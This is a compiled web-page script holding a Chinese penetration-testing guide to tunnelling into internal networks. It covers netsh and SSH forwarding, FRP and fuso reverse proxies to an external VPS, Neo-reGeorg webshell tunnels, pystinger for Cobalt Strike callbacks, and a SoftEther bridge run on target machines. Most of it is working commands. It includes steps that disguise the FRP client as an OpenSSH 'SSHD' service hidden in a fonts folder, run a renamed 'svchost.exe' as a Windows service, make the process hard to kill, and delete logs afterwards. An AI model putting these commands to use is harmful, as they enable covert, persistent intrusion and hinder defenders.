import{_ as p}from"./_plugin-vue_export-helper.cdc0426e.js";import{o as u,c as m,d as l,w as n,a as e,b as s,e as c,r as d}from"./app.3b9f01e1.js";const v="/assets/clip_image001.16dd6ff0.jpg",b="/assets/clip_image001-1669294615031.524bc4b1.png",h={},k=e("h2",{id:"网络连通性测试",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#网络连通性测试","aria-hidden":"true"},"#"),s(" 网络连通性测试")],-1),_=e("p",null,"能出网的做反向代理，不能出网的做正向代理",-1),g=e("div",{class:"language-powershell line-numbers-mode","data-ext":"powershell"},[e("pre",{class:"language-powershell"},[e("code",null,[s("ping 114"),e("span",{class:"token punctuation"},"."),s("114"),e("span",{class:"token punctuation"},"."),s("114"),e("span",{class:"token punctuation"},"."),s("114 "),e("span",{class:"token operator"},"-"),s(`n 1
`)])]),e("div",{class:"line-numbers","aria-hidden":"true"},[e("div",{class:"line-number"})])],-1),f=e("div",{class:"language-bash line-numbers-mode","data-ext":"sh"},[e("pre",{class:"language-bash"},[e("code",null,[e("span",{class:"token function"},"ping"),s(),e("span",{class:"token number"},"114.114"),s(".114.114 "),e("span",{class:"token parameter variable"},"-c"),s(),e("span",{class:"token number"},"1"),s(`
`)])]),e("div",{class:"line-numbers","aria-hidden":"true"},[e("div",{class:"line-number"})])],-1),S=e("p",null,[e("strong",null,"是否存在Nginx反向代理")],-1),x=e("p",null,"找到Nginx目录，查看配置文件",-1),P=e("p",null,"某次实战中发现正反向都代理不出去，查看配置文件发现了nginx反代，直接连接公网IP代理的3389",-1),w=e("h2",{id:"客户端代理工具",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#客户端代理工具","aria-hidden":"true"},"#"),s(" 客户端代理工具")],-1),y=e("p",null,"Proxifier全局代理",-1),N={href:"https://github.com/rofl0r/proxychains-ng",target:"_blank",rel:"noopener noreferrer"},V=e("h2",{id:"端口转发-高权限无工具",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#端口转发-高权限无工具","aria-hidden":"true"},"#"),s(" 端口转发-高权限无工具")],-1),A=e("h3",{id:"windows-netsh-端口转发-双网卡用",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#windows-netsh-端口转发-双网卡用","aria-hidden":"true"},"#"),s(" Windows netsh 端口转发（双网卡用）")],-1),E=e("p",null,"netsh仅支持TCP协议， 适用于双网卡服务器",-1),H=e("p",null,"连接外网6666端口，就是连接到内网目标上面的3389。",-1),C=e("div",{class:"language-powershell line-numbers-mode","data-ext":"powershell"},[e("pre",{class:"language-powershell"},[e("code",null,[e("span",{class:"token comment"},"#查看现有规则"),s(`
netsh interface portproxy show all

`),e("span",{class:"token comment"},"#添加转发规则"),s(`
netsh interface portproxy `),e("span",{class:"token function"},"set"),s(` v4tov4 listenaddress=外网IP listenport=6666 connectaddress=内网IP connectport=3389
`)])]),e("div",{class:"line-numbers","aria-hidden":"true"},[e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"})])],-1),I=e("div",{class:"language-powershell line-numbers-mode","data-ext":"powershell"},[e("pre",{class:"language-powershell"},[e("code",null,[e("span",{class:"token comment"},"#删除转发规则"),s(`
netsh interface portproxy delete v4tov4 listenport=6666

`),e("span",{class:"token comment"},"#xp需要安装ipv6"),s(`
netsh interface ipv6 install
`)])]),e("div",{class:"line-numbers","aria-hidden":"true"},[e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"})])],-1),L=e("h3",{id:"linux-ssh隧道-高权限用",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#linux-ssh隧道-高权限用","aria-hidden":"true"},"#"),s(" Linux SSH隧道（高权限用）")],-1),W=e("p",null,"SSH一般是允许通过防火墙的，而且传输过程是加密的",-1),F=e("p",null,"在中转VPS上执行以下命令",-1),D=e("div",{class:"language-bash line-numbers-mode","data-ext":"sh"},[e("pre",{class:"language-bash"},[e("code",null,[e("span",{class:"token function"},"ssh"),s(),e("span",{class:"token parameter variable"},"-CfNg"),s(),e("span",{class:"token parameter variable"},"-L"),s(),e("span",{class:"token operator"},"<"),s("VPS监听端口"),e("span",{class:"token operator"},">"),s(":"),e("span",{class:"token operator"},"<"),s("目标内网IP"),e("span",{class:"token operator"},">"),s(":"),e("span",{class:"token operator"},"<"),s("目标端口"),e("span",{class:"token operator"},">"),s(),e("span",{class:"token operator"},"<"),s("root@目标外网Web服务器，会要求输入密码"),e("span",{class:"token operator"},">"),s(`
`),e("span",{class:"token function"},"ssh"),s(),e("span",{class:"token parameter variable"},"-CfNg"),s(),e("span",{class:"token parameter variable"},"-L"),s(),e("span",{class:"token number"},"8080"),s(`:10.1.1.3:3389 root@100.100.1.100

`),e("span",{class:"token comment"},"#VPS上查看8090端口是否已经连接"),s(`
`),e("span",{class:"token function"},"netstat"),s(),e("span",{class:"token parameter variable"},"-tulnp"),s(),e("span",{class:"token operator"},"|"),s(),e("span",{class:"token function"},"grep"),s(),e("span",{class:"token string"},'"8090"'),s(`
`)])]),e("div",{class:"line-numbers","aria-hidden":"true"},[e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"})])],-1),R=e("p",null,"连接目标内网服务器的远程桌面 SSH进程的本地端口映射，将本地端口转发到远端指定机器的指定端口（VPS-IP:8090）",-1),T=e("p",null,"在本地监听一个端口，所有访问这个端口的流量都会通过SSH隧道传输到远端的对应端口",-1),O=e("p",null,"在Web服务器上执行如下命令",-1),B=e("div",{class:"language-bash line-numbers-mode","data-ext":"sh"},[e("pre",{class:"language-bash"},[e("code",null,[e("span",{class:"token function"},"ssh"),s(),e("span",{class:"token parameter variable"},"-CfNg"),s(),e("span",{class:"token parameter variable"},"-R"),s(),e("span",{class:"token operator"},"<"),s("VPS的端口"),e("span",{class:"token operator"},">"),s(":"),e("span",{class:"token operator"},"<"),s("目标内网IP"),e("span",{class:"token operator"},">"),s(":"),e("span",{class:"token operator"},"<"),s("目标端口"),e("span",{class:"token operator"},">"),s(),e("span",{class:"token operator"},"<"),s("root@VPS-IP，会要求输入密码"),e("span",{class:"token operator"},">"),s(`
`),e("span",{class:"token function"},"ssh"),s(),e("span",{class:"token parameter variable"},"-CfNg"),s(),e("span",{class:"token parameter variable"},"-R"),s(),e("span",{class:"token number"},"8090"),s(`:10.1.1.3:3389 root@192.168.0.1
`)])]),e("div",{class:"line-numbers","aria-hidden":"true"},[e("div",{class:"line-number"}),e("div",{class:"line-number"})])],-1),M=e("p",null,"访问VPS的8090端口，即可连接内网数据库服务器的3389（VPS-IP:8090）",-1),U=e("p",null,"所有访问VPS的8090端口的流量都会通过SSH隧道传输到数据库服务器的3389端口",-1),G=e("h2",{id:"frp-反向代理",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#frp-反向代理","aria-hidden":"true"},"#"),s(" FRP 反向代理")],-1),Y=e("h3",{id:"服务端配置",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#服务端配置","aria-hidden":"true"},"#"),s(" 服务端配置")],-1),z=e("div",{class:"language-bash line-numbers-mode","data-ext":"sh"},[e("pre",{class:"language-bash"},[e("code",null,[e("span",{class:"token punctuation"},"["),s("common"),e("span",{class:"token punctuation"},"]"),s(`
bind_addr `),e("span",{class:"token operator"},"="),s(),e("span",{class:"token number"},"0.0"),s(`.0.0
bind_port `),e("span",{class:"token operator"},"="),s(),e("span",{class:"token number"},"60001"),s(`
kcp_bind_port `),e("span",{class:"token operator"},"="),s(),e("span",{class:"token number"},"60001"),s(`
token `),e("span",{class:"token operator"},"="),s(` pwdpwd.886
`)])]),e("div",{class:"line-numbers","aria-hidden":"true"},[e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"})])],-1),K=e("div",{class:"language-bash line-numbers-mode","data-ext":"sh"},[e("pre",{class:"language-bash"},[e("code",null,[e("span",{class:"token comment"},"#使用systemd的方式创建守护进程（后台运行）创建frps.service文件"),s(`

`),e("span",{class:"token function"},"cat"),s(),e("span",{class:"token operator"},">"),s(" /usr/lib/systemd/system/frps.service "),e("span",{class:"token operator"},"<<"),s(),e("span",{class:"token string"},`EOF
[Unit]
Description=Frp Server Service
After=network.target
[Service]
Type=simple
User=nobody
Restart=on-failure
RestartSec=5s
ExecStart=/usr/bin/frps -c /etc/frp/frps.ini
LimitNOFILE=1048576
[Install]
WantedBy=multi-user.target
EOF`),s(`

`),e("span",{class:"token function"},"chmod"),s(` +x frps
`),e("span",{class:"token function"},"mv"),s(` frps /usr/bin/frps
`),e("span",{class:"token function"},"mkdir"),s(),e("span",{class:"token parameter variable"},"-p"),s(` /etc/frp
`),e("span",{class:"token function"},"mv"),s(` frps.ini /etc/frp/frps.ini

systemctl start frps
`)])]),e("div",{class:"line-numbers","aria-hidden":"true"},[e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"})])],-1),j=c(`<h3 id="客户端配置" tabindex="-1"><a class="header-anchor" href="#客户端配置" aria-hidden="true">#</a> 客户端配置</h3><p>客户端配置文件</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">cat</span> <span class="token operator">&gt;</span> /usr/share/fonts/fonts.ini <span class="token operator">&lt;&lt;</span> <span class="token string">EOF
[common]
server_addr = 127.0.0.1
server_port = 60001
token=pwdpwd.886
tls_enable = true

[socks5]
type = tcp
remote_port =2333
plugin = socks5
plugin_user = admin
plugin_passwd = admin123456
use_encryption = true
use_compression = true
EOF</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>启动客户端</p>`,4),Z=e("div",{class:"language-powershell line-numbers-mode","data-ext":"powershell"},[e("pre",{class:"language-powershell"},[e("code",null,[e("span",{class:"token comment"},"#带控制台的应用作为windows服务启动"),s(`
`),e("span",{class:"token comment"},"#安装srvany.exe为系统服务"),s(`
`),e("span",{class:"token function"},"sc"),s(" create svnservice binPath= "),e("span",{class:"token string"},'"C:\\Users\\Public\\Music\\srvany.exe"'),s(" depend= Tcpip "),e("span",{class:"token function"},"start"),s(`= auto

`),e("span",{class:"token comment"},"#加入要执行的文件的信息"),s(`
reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\svnservice\\Parameters `),e("span",{class:"token operator"},"/"),s("v Application "),e("span",{class:"token operator"},"/"),s("t REG_SZ "),e("span",{class:"token operator"},"/"),s("d "),e("span",{class:"token string"},'"C:\\Users\\Public\\Music\\svchost.exe"'),s(),e("span",{class:"token operator"},"/"),s(`f
reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\svnservice\\Parameters `),e("span",{class:"token operator"},"/"),s("v AppParameters "),e("span",{class:"token operator"},"/"),s("t REG_SZ "),e("span",{class:"token operator"},"/"),s("d "),e("span",{class:"token string"},'"-c C:\\Users\\Public\\Music\\sys.ini"'),s(`

`),e("span",{class:"token comment"},"#启动服务"),s(`
`),e("span",{class:"token function"},"sc"),s(),e("span",{class:"token function"},"start"),s(` svnservice
`)])]),e("div",{class:"line-numbers","aria-hidden":"true"},[e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"})])],-1),J=e("div",{class:"language-bash line-numbers-mode","data-ext":"sh"},[e("pre",{class:"language-bash"},[e("code",null,[e("span",{class:"token comment"},"#找个隐蔽目录丢进去就行 /usr/share/fonts"),s(`
`),e("span",{class:"token function"},"chmod"),s(` +x /usr/share/fonts/SSHD

`),e("span",{class:"token comment"},"#1）创建被监控的脚本"),s(`
`),e("span",{class:"token function"},"cat"),s(),e("span",{class:"token operator"},">"),s(" /usr/local/share/sshd.sh "),e("span",{class:"token operator"},"<<"),e("span",{class:"token string"},`EOF
#!/bin/bash
# sshd.sh
nohup /usr/share/fonts/SSHD -c /usr/share/fonts/fonts.ini > /usr/share/fonts/fonts.out &
EOF`),s(`
`),e("span",{class:"token function"},"chmod"),s(` +x /usr/local/share/sshd.sh
`),e("span",{class:"token function"},"ln"),s(),e("span",{class:"token parameter variable"},"-sf"),s(` /usr/local/share/sshd.sh /usr/sbin/SSHD


`),e("span",{class:"token comment"},"#2）创建服务文件，设置守护进程托管"),s(`
`),e("span",{class:"token function"},"cat"),s(),e("span",{class:"token operator"},">"),s(" /usr/lib/systemd/system/SSHD.service "),e("span",{class:"token operator"},"<<"),e("span",{class:"token string"},`EOF
[Unit]
Description=OpenSSH server daemon
Documentation=man:sshd(8) man:sshd_config(5)
After=network.target
[Service]
Type=forking
ExecStart=/usr/sbin/SSHD
ExecStartPost=/bin/sleep 0.2
KillMode=process
Restart=always
RestartSec=1s
[Install]
WantedBy=multi-user.target
EOF`),s(`

systemctl start SSHD
systemctl `),e("span",{class:"token builtin class-name"},"enable"),s(` SSHD.service


`),e("span",{class:"token comment"},"#加上下边的配置 进程完全杀不死（只能重启机器）"),s(`
`),e("span",{class:"token comment"},"#ExecReload=/bin/kill -HUP $MAINPID"),s(`
`)])]),e("div",{class:"line-numbers","aria-hidden":"true"},[e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"})])],-1),$=e("h2",{id:"fuso-反向代理",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#fuso-反向代理","aria-hidden":"true"},"#"),s(" fuso 反向代理")],-1),q={href:"https://github.com/editso/fuso",target:"_blank",rel:"noopener noreferrer"},Q=c("<table><thead><tr><th>Name</th><th>✔(Achieved) / ❌(Unrealized))</th></tr></thead><tbody><tr><td>端口转发</td><td>✔</td></tr><tr><td>传输加密</td><td>✔</td></tr><tr><td>socks5</td><td>✔</td></tr><tr><td>socks5 udp 转发</td><td>✔</td></tr><tr><td>kcp 支持</td><td>✔</td></tr><tr><td>多映射</td><td>✔</td></tr><tr><td>级联代理</td><td>✔</td></tr><tr><td>数据传输压缩</td><td>✔</td></tr><tr><td>websocket</td><td>❌</td></tr><tr><td>Rsa加密</td><td>✔</td></tr><tr><td>Aes加密</td><td>✔</td></tr></tbody></table>",1),X=e("div",{class:"language-bash line-numbers-mode","data-ext":"sh"},[e("pre",{class:"language-bash"},[e("code",null,[e("span",{class:"token function"},"nohup"),s(" ./fus "),e("span",{class:"token operator"},"&"),s(`
`)])]),e("div",{class:"line-numbers","aria-hidden":"true"},[e("div",{class:"line-number"})])],-1),ee=e("div",{class:"language-bash line-numbers-mode","data-ext":"sh"},[e("pre",{class:"language-bash"},[e("code",null,[e("span",{class:"token comment"},"#转发局域网的本地端口到VPS的4430端口上"),s(`
fuc.exe  `),e("span",{class:"token number"},"139.198"),s(".35.248 --forward-host "),e("span",{class:"token number"},"192.168"),s(".1.100 --forward-port "),e("span",{class:"token number"},"443"),s(),e("span",{class:"token parameter variable"},"-b"),s(),e("span",{class:"token number"},"4430"),s(`
 
`),e("span",{class:"token comment"},"#创建Socks5代理，访问VPS的2333端口（有认证）"),s(`
fuc.exe `),e("span",{class:"token number"},"139.198"),s(".35.248 "),e("span",{class:"token parameter variable"},"--socks"),s(),e("span",{class:"token parameter variable"},"--su"),s(),e("span",{class:"token parameter variable"},"--s5u"),s(" admin "),e("span",{class:"token parameter variable"},"--s5p"),s(" @admin.886 "),e("span",{class:"token parameter variable"},"-b"),s(),e("span",{class:"token number"},"2333"),s(`
`)])]),e("div",{class:"line-numbers","aria-hidden":"true"},[e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"}),e("div",{class:"line-number"})])],-1),se=e("h2",{id:"neo-regeorg-正向代理",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#neo-regeorg-正向代理","aria-hidden":"true"},"#"),s(" Neo-reGeorg 正向代理")],-1),ne={href:"https://github.com/L-codes/Neo-reGeorg",target:"_blank",rel:"noopener noreferrer"},ae=c(`<p>配合webshell，复用目标的Web服务端口开一个Socks5代理隧道</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>python3 neoreg.py generate <span class="token parameter variable">-k</span> password
<span class="token comment">#生成服务端</span>

python3 neoreg.py <span class="token parameter variable">-k</span> password <span class="token parameter variable">-u</span> http://xx/tunnel.php
<span class="token comment">#在本地建立Socks5代理</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,2),te={href:"https://github.com/FunnyWolf/pystinger",target:"_blank",rel:"noopener noreferrer"},re=e("p",null,"天蝎Webshell管理工具自带正向代理",-1),le=e("h2",{id:"softether-vpn",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#softether-vpn","aria-hidden":"true"},"#"),s(" Softether VPN")],-1),ie={href:"https://www.softether.org/5-download",target:"_blank",rel:"noopener noreferrer"},oe=c('<p><img src="'+v+`" alt="1_bridge.jpg" loading="lazy"></p><p>在每个站点上，SoftEther VPN可以定义一个虚拟集线器，并使用本地网桥功能在虚拟集线器和物理以太网段之间连接。相当于把多个不同网段的局域网连接到一起。</p><p>在公司网络的总部或数据中心，将SoftEther VPN服务器设置为VPN的中央服务器（就是自己的VPS）</p><h3 id="安装vpn-server-在自己的vps上" tabindex="-1"><a class="header-anchor" href="#安装vpn-server-在自己的vps上" aria-hidden="true">#</a> 安装VPN Server（在自己的VPS上）</h3><p>使用修改过源码的Docker版安装，这个支持拆分隧道；</p><p>也就是连接上VPN后只有你指定的IP段才会走VPN流量，其它时候不影响你正常上网。</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">docker</span> pull abyssviper/softethervpn
<span class="token function">docker</span> run <span class="token parameter variable">-d</span> <span class="token parameter variable">--name</span> vpn <span class="token parameter variable">-p</span> <span class="token number">443</span>:5555 abyssviper/softethervpn
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>默认监听了4个端口：443,992,1194,5555</p><p>HTTPS访问可看到Web管理页面，VPN配置完成后需要禁止访问Web页面</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>./vpnserver stop</td><td>#操作前先停止VPN</td></tr><tr><td>vim vpn_server.config</td><td>bool DisableJsonRpcWebApi true</td></tr><tr><td>./vpnserver start</td><td>#启动VPN服务器</td></tr></tbody></table><h3 id="设置vpn-server" tabindex="-1"><a class="header-anchor" href="#设置vpn-server" aria-hidden="true">#</a> 设置VPN Server</h3><p>下载vpn server管理端（Bridge），连接VPN Server默认密码为空，连接后会提示修改。</p><p>创建虚拟HUB - 并添加用户(user1/pwd123456)</p><h3 id="各个分支网桥级联" tabindex="-1"><a class="header-anchor" href="#各个分支网桥级联" aria-hidden="true">#</a> 各个分支网桥级联</h3><p>在每个分支上，配置 VPN Bridge 以保持与中央 VPN 服务器的级联连接。</p><p>创建连接到本地的服务器（密码br123456），端点选择站点到站点。</p><p><img src="`+b+`" alt="SoftEther VPN Bridge  " loading="lazy"></p><p>管理虚拟Hub - 虚拟NAT和虚拟DHCP - 启用secureNAT</p><p>等待几分钟，等配置保存......</p><h3 id="目标机器反向vpn" tabindex="-1"><a class="header-anchor" href="#目标机器反向vpn" aria-hidden="true">#</a> 目标机器反向VPN</h3><div class="language-powershell line-numbers-mode" data-ext="powershell"><pre class="language-powershell"><code><span class="token comment">#打开C:\\Program Files\\SoftEther VPN Bridge目录，将以下文件扔到目标机器执行</span>
hamcore<span class="token punctuation">.</span>se2、vpn_bridge<span class="token punctuation">.</span>config、vpnbridge<span class="token punctuation">.</span>exe<span class="token punctuation">(</span>可改名<span class="token punctuation">)</span>

vbr<span class="token punctuation">.</span>exe <span class="token operator">/</span>usermode
<span class="token comment">#使用完后kill进程，删除当前目录下的日志文件夹</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,21);function ce(de,pe){const i=d("Tabs"),o=d("ExternalLinkIcon");return u(),m("div",null,[k,_,l(i,{id:"6",data:[{title:"Windows"},{title:"Linux"}]},{tab0:n(({title:a,value:t,isActive:r})=>[g]),tab1:n(({title:a,value:t,isActive:r})=>[f]),_:1}),S,x,P,w,l(i,{id:"26",data:[{title:"Windows"},{title:"Linux"}]},{tab0:n(({title:a,value:t,isActive:r})=>[y]),tab1:n(({title:a,value:t,isActive:r})=>[e("p",null,[e("a",N,[s("proxychains"),l(o)])])]),_:1}),V,A,E,H,l(i,{id:"50",data:[{title:"启动转发"},{title:"取消转发"}]},{tab0:n(({title:a,value:t,isActive:r})=>[C]),tab1:n(({title:a,value:t,isActive:r})=>[I]),_:1}),L,W,l(i,{id:"64",data:[{title:"本地转发（正向）"},{title:"远程转发（反向）"}]},{tab0:n(({title:a,value:t,isActive:r})=>[F,D,R,T]),tab1:n(({title:a,value:t,isActive:r})=>[O,B,M,U]),_:1}),G,Y,l(i,{id:"96",data:[{title:"服务端配置文件"},{title:"启动服务端"}]},{tab0:n(({title:a,value:t,isActive:r})=>[z]),tab1:n(({title:a,value:t,isActive:r})=>[K]),_:1}),j,l(i,{id:"114",data:[{title:"Windows"},{title:"Linux"}]},{tab0:n(({title:a,value:t,isActive:r})=>[Z]),tab1:n(({title:a,value:t,isActive:r})=>[J]),_:1}),$,e("p",null,[s("在FRP在Windows上被杀软干掉的时候备用，下载地址："),e("a",q,[s("https://github.com/editso/fuso"),l(o)])]),Q,l(i,{id:"230",data:[{title:"服务端（我们自己的VPS）"},{title:"客户端（目标主机）"}]},{tab0:n(({title:a,value:t,isActive:r})=>[X]),tab1:n(({title:a,value:t,isActive:r})=>[ee]),_:1}),se,e("p",null,[s("下载地址："),e("a",ne,[s("https://github.com/L-codes/Neo-reGeorg"),l(o)])]),ae,e("p",null,[s("毒刺,可直接用于Metasploit、Cobaltstrike上线 "),e("a",te,[s("GitHub - FunnyWolf/pystinge"),l(o)])]),re,le,e("p",null,[e("a",ie,[s("https://www.softether.org/5-download"),l(o)])]),oe])}const ve=p(h,[["render",ce],["__file","构建通道漫游内网.html.vue"]]);export{ve as default};
